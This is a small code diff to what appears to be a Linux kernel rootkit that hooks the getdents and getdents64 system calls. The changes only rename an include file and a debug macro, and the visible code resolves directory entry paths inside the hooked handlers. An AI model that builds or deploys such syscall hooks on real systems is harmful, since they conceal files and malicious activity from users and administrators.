@@ -1,5 +1,5 @@
 #include "../inc/cmds.h"
-#include "../inc/hook.h"
+#include "../inc/hooks.h"
 #include "../inc/util.h"
 
 #include <linux/dirent.h>
@@ -38,7 +38,7 @@ asmlinkage int64_t h_getdents(const struct pt_regs *r) {
   }
 
   if (NULL == (fd_path = path_from_fd(fd, fd_path))) {
-    debgf("failed to get path from fd %d", fd);
+    debg("failed to get path from fd %d", fd);
     goto end;
   }
 
@@ -58,12 +58,12 @@ asmlinkage int64_t h_getdents(const struct pt_regs *r) {
     cur = (void *)dirl + pos;
 
     if (NULL == (cur_path = path_join(fd_path, cur->d_name))) {
-      debgf("failed to obtain current path for entry: %s", cur->d_name);
+      debg("failed to obtain current path for entry: %s", cur->d_name);
       goto next;
     }
 
     if (kern_path(cur_path, LOOKUP_FOLLOW, &path) != 0) {
-      debgf("failed to obtain path for entry: %s", cur->d_name);
+      debg("failed to obtain path for entry: %s", cur->d_name);
       goto next;
     }
 
@@ -128,7 +128,7 @@ asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
   }
 
   if (NULL == (fd_path = path_from_fd(fd, fd_path))) {
-    debgf("failed to get path from fd %d", fd);
+    debg("failed to get path from fd %d", fd);
     goto end;
   }
 
@@ -148,12 +148,12 @@ asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
     cur = (void *)dirl + pos;
 
     if (NULL == (cur_path = path_join(fd_path, cur->d_name))) {
-      debgf("failed to obtain current path for entry: %s", cur->d_name);
+      debg("failed to obtain current path for entry: %s", cur->d_name);
       goto next;
     }
 
     if (kern_path(cur_path, LOOKUP_FOLLOW, &path) != 0) {
-      debgf("failed to obtain path for entry: %s", cur->d_name);
+      debg("failed to obtain path for entry: %s", cur->d_name);
       goto next;
     }
 
